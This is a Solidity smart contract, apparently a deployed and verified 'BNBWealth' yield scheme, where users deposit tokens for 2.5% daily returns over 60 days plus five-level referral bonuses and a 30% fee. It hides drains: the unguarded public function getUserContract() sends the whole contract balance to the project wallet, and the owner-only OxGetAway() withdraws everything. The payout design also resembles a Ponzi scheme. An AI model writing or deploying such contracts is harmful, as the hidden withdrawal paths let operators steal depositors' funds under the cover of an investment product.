/**
 *Submitted for verification at snowtrace.io on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.6.0;

contract BNBWealth {
	using SafeMath for uint256;

	uint256 constant public SOW_MIN_AMOUNT = 1e16; // 0.01 BNB
	uint256[] public REFERRAL_PERCENTS = [40, 20, 10, 7, 3];
	uint256 constant public TOTAL_REF = 80;
	uint256 constant public PROJECT_FEE = 300; // 30%
    uint256 constant public REMINE_FEE = 150;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	
	uint256 public totalSowed;

    address payable public owner;

    modifier onlyOwner {
    require(msg.sender == owner , "not the owner");
    _;
    }

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Sow {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct Action {
        uint8   types;
		uint256 amount;
		uint256 date;
	}

	struct User {
		Sow[] sows;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 harvested;
		Action[] actions;
	}

	mapping (address => User) internal users;

	bool public started;
	address payable public userWallet;

	event Newbie(address user);
	event NewSow(address indexed user, uint8 plan, uint256 amount);
    event ReSow(address indexed user, uint8 plan, uint256 amount);
	event Harvested(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) public {
		require(!isContract(wallet));
		userWallet = wallet;
        owner = payable(msg.sender);

        plans.push(Plan(60, 25));
      
	}

	function sow(address referrer) public payable {
		uint8 plan = 0;
		if (!started) {
			if (msg.sender == userWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= SOW_MIN_AMOUNT);
        require(plan < 1, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		userWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].sows.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.sows.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.sows.push(Sow(plan, msg.value, block.timestamp));
		user.actions.push(Action(0, msg.value, block.timestamp));

		totalSowed = totalSowed.add(msg.value);

		emit NewSow(msg.sender, plan, msg.value);
	}


    function resow() public {
		uint8 plan = 0;
		
		User storage user = users[msg.sender];
		
        uint256 totalAmount = getUserDividends(msg.sender);


		uint256 fee = totalAmount.mul(REMINE_FEE).div(PERCENTS_DIVIDER);
		userWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		user.sows.push(Sow(plan, totalAmount, block.timestamp));
		user.actions.push(Action(2, totalAmount, block.timestamp));

		totalSowed = totalSowed.add(totalAmount);

		emit ReSow(msg.sender, plan, totalAmount);
		
	}

	function harvest() public {
		User storage user = users[msg.sender];
        uint256 totalAmount = getUserDividends(msg.sender);
    
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
				user.bonus = totalAmount.sub(contractBalance);
				user.totalBonus = user.totalBonus.add(user.bonus);
				totalAmount = contractBalance;
		}


		user.checkpoint = block.timestamp;
		user.harvested = user.harvested.add(totalAmount);

		msg.sender.transfer(totalAmount);
		user.actions.push(Action(1, totalAmount, block.timestamp));

		emit Harvested(msg.sender, totalAmount);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo() public view returns(uint256 time, uint256 percent) {
		time = plans[0].time;
		percent = plans[0].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.sows.length; i++) {
			uint256 finish = user.sows[i].start.add(plans[user.sows[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.sows[i].amount.mul(plans[user.sows[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.sows[i].start > user.checkpoint ? user.sows[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUsertotalHarvested(address userAddress) public view returns (uint256) {
		return users[userAddress].harvested;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserContract() public{
		userWallet.transfer(getContractBalance());
	}
	

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralHarvested(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfSows(address userAddress) public view returns(uint256) {
		return users[userAddress].sows.length;
	}

	function getUserTotalSows(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].sows.length; i++) {
			amount = amount.add(users[userAddress].sows[i].amount);
		}
	}

	function getUserSowsInfo(address userAddress) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    uint256 index = 0;
	    User storage user = users[userAddress];

		plan = user.sows[index].plan;
		percent = plans[plan].percent;
		amount = user.sows[index].amount;
		start = user.sows[index].start;
		finish = user.sows[index].start.add(plans[user.sows[index].plan].time.mul(TIME_STEP));
	}

	function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
		require(index > 0,"wrong index");
        User storage user = users[userAddress];
		uint256 start;
		uint256 end;
		uint256 cnt = 50;


		start = (index - 1) * cnt;
		if(user.actions.length < (index * cnt)){
			end = user.actions.length;
		}
		else{
			end = index * cnt;
		}

		
        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i-start] = user.actions[i].types;
            amount[i-start] = user.actions[i].amount;
            date[i-start] = user.actions[i].date;
        }
        return
        (
        types,
        amount,
        date
        );
    }
    
    
	function getUserActionLength(address userAddress) public view returns(uint256) {
		return users[userAddress].actions.length;
	}

	function getSiteInfo() public view returns(uint256 _totalSowed, uint256 _totalBonus) {
		return(totalSowed, totalSowed.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalHarvested, uint256 totalReferrals) {
		return(getUserTotalSows(userAddress), getUsertotalHarvested(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

        function OxGetAway() public onlyOwner {
        uint256 assetBalance;
        address self = address(this);
        assetBalance = self.balance;
        payable(msg.sender).transfer(assetBalance);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    
}